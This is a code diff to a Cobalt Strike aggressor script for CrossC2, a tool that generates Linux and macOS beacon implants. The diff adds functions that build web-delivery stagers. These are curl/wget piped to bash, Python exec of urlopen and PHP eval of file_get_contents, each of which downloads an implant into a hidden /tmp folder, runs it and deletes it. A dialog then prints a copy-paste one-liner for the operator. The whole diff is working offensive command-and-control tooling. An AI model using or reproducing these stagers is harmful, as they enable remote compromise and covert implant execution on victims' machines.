@@ -54,6 +54,70 @@ sub checkSpace {
     return $realPath;
 }
 
+sub genDownloadPayload {
+    # "python", "ruby", "pip", "php", "ksh"
+    $type = $1;
+    $payloadContentURL = $2;
+    $downloadURL = "";
+    if ($type eq "curl") {
+        $downloadURL = "curl -A O -o- -L ".$payloadContentURL." | bash -s";
+    } else if ($type eq "wget") {
+        $downloadURL = "wget -U O -O - ".$payloadContentURL." | bash -s";
+    } else if ($type eq "python") {
+        $downloadURL = "python -c \"import urllib2; exec urllib2.urlopen('".$payloadContentURL."').read()\"";
+    } else if ($type eq "php") {
+        $downloadURL = "php -r \"eval(file_get_contents('".$payloadContentURL."'));\"";
+    } else if ($type eq "ksh") {
+
+    }
+    return $downloadURL;
+}
+
+sub genDownloadPayloadContent {
+    $type = $1;
+    $beaconUrl = $2;
+    $payload = "";
+
+    $targetSaveDir = random_string(5);
+    $targetSaveDir = '.'.$targetSaveDir.'';
+    $targetSaveName = random_string(10);
+    $targetSavePath = "/tmp/".$targetSaveDir."/".$targetSaveName;
+
+    if ($type eq "curl") {
+        $payload = "mkdir /tmp/".$targetSaveDir.";";
+        $payload = $payload." rm -f ".$targetSavePath.";";
+        $payload = $payload." curl -A O -L ".$beaconUrl." -o ".$targetSavePath.";";
+        $payload = $payload." chmod 755 ".$targetSavePath.";";
+        $payload = $payload." ".$targetSavePath.";";
+        $payload = $payload." sleep 20;";
+        $payload = $payload." rm -rf ".$targetSavePath;
+    } else if ($type eq "wget") {
+        $payload = "mkdir /tmp/".$targetSaveDir.";";
+        $payload = $payload." rm -f ".$targetSavePath.";";
+        $payload = $payload." wget -U 'O' ".$beaconUrl." -O ".$targetSavePath.";";
+        $payload = $payload." chmod 755 ".$targetSavePath.";";
+        $payload = $payload." ".$targetSavePath.";";
+        $payload = $payload." sleep 20;";
+        $payload = $payload." rm -rf ".$targetSavePath;
+    } else if ($type eq "python") {
+        $payload = "import sys\nimport os\nimport time\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\n";
+        $payload = $payload."os.system('mkdir /tmp/".$targetSaveDir."; rm -f ".$targetSavePath."')\n";
+        $payload = $payload."r.urlretrieve('".$beaconUrl."', '".$targetSavePath."')\n";
+        $payload = $payload."os.system('chmod 755 ".$targetSavePath."')\n";
+        $payload = $payload."os.system('".$targetSavePath."')\n";
+        $payload = $payload."time.sleep(20)\n";
+        $payload = $payload."os.system('rm -f ".$targetSavePath."')\n";
+    } else if ($type eq "php") {
+        $payload = "system('mkdir /tmp/".$targetSaveDir."; rm -f ".$targetSavePath."');";
+        $payload = $payload."\$c=file_get_contents('".$beaconUrl."');file_put_contents('".$targetSavePath."', \$c);";
+        $payload = $payload."system('chmod 755 ".$targetSavePath."');";
+        $payload = $payload."system('".$targetSavePath."');";
+        $payload = $payload."sleep(20);";
+        $payload = $payload."system('rm -f ".$targetSavePath."');";
+    }
+    return $payload;
+}
+
 sub dialogCallBack {
     elog("");
     $system = $3['system'];
@@ -67,6 +131,8 @@ sub dialogCallBack {
     $listener_info = listener_info($listener);
     $host = $listener_info['host'];
     $port = $listener_info['port'];
+    $domain = $listener_info['beacons'];
+    $domain = replace($domain, ', ', ',');
 
     $outputFileName = checkSpace($outputFileName);
     $rebind_lib = checkSpace($rebind_lib);
@@ -80,8 +146,7 @@ sub dialogCallBack {
     $genCC2 = $CC2_PATH . $CC2_BIN;  
 
 
-
-    $genCC2 = $genCC2." ".$host." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system." ".$arch." ".$outputFileName;
+    $genCC2 = $genCC2." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system." ".$arch." ".$outputFileName;
     elog($genCC2);
     $process = exec($genCC2);
     $data = readAll($process);
@@ -94,28 +159,32 @@ sub dialogCallBack {
 
     $uri = $3['uri'];
     $lport = $3['lport'];
+    $type = $3['type'];
+
 
     $targetSaveName = random_string(10);
 
     # host CrossC2 beacon
-    $payloadUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", "CrossC2 beacon ".$system." ".$arch); 
+    $beaconUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", "CrossC2 beacon ".$system." ".$arch); 
 
-    $targetSaveName = '.'.$targetSaveName.'';
-
-    # host script
-    $script = "wget -U 'O' ".$payloadUrl." -O /tmp/".$targetSaveName." && chmod 777 /tmp/".$targetSaveName." && /tmp/".$targetSaveName." && sleep 7 && rm -f /tmp/".$targetSaveName;
-    $scriptUrl = site_host($host, $lport, $uri, $script, "automatic", "Script Unix Web Delivery (curl)");
+    # gen payloadContent
+    $payloadContent = genDownloadPayloadContent($type, $beaconUrl);
+    # host payloadContent
+    $payloadContentURL = site_host($host, $lport, $uri, $payloadContent, "automatic", "Script Unix Web Delivery (".$type.")");
+    # gen payload
+    $scriptUrl = genDownloadPayload($type, $payloadContentURL);
 
     # tell the user our URL
-    prompt_text("Copy/Paste One-liner: ", "curl -A o -o- -L " . $scriptUrl . " | bash -s", {});
-    elog("CrossC2 ".$system." ".$arch.":   curl -A o -o- -L " . $scriptUrl . " | bash -s");
+    prompt_text("Copy/Paste One-liner: ", $scriptUrl, {});
+    elog("CrossC2 ".$system." ".$arch.": " . $scriptUrl);
 }
 
 sub genCrossC2 {
-    $dialog = dialog("CrossC2 Payload Generator", %(uri => "/a", lport => "55413", beaconKey => "./.cobaltstrike.beacon_keys", rebind_lib => "null", listener => "Listener: ", system => "System: ", arch => "Arch: ", payload_type => "Payload_Type: ", outputFileName => "/tmp/CrossC2-test"), &dialogCallBack);
+    $dialog = dialog("CrossC2 Payload Generator", %(uri => "/a", lport => "55413", type => "curl", beaconKey => "./.cobaltstrike.beacon_keys", rebind_lib => "null", listener => "Listener: ", system => "System: ", arch => "Arch: ", payload_type => "Payload_Type: ", outputFileName => "/tmp/CrossC2-test"), &dialogCallBack);
     dialog_description($dialog, "<style type=\"text/css\">.word{width: 100px;height: 30px;background: #E5E5E5;text-align: center;line-height: 30px;font-size: 14px;}</style><div class=\"word\">Export CrossC2 Payload<br><a href=\"https://github.com/gloxec/CrossC2\">https://github.com/gloxec/CrossC2</a></div>");
     drow_text($dialog, "uri", "URI Path: ", 20);
     drow_text($dialog, "lport", "Web Delivery Port: ", 20);
+    drow_combobox($dialog, "type", "Type: ", @("curl", "wget", "python", "php"));
     drow_file($dialog, "beaconKey", "Choose: default ./.cobaltstrike.beacon_keys");
     drow_file($dialog, "rebind_lib", "Choose: rebind_dynamic_lib");
     drow_combobox($dialog, "system", "System: ", @("Linux", "MacOS", "Linux-bind", "MacOS-bind"));
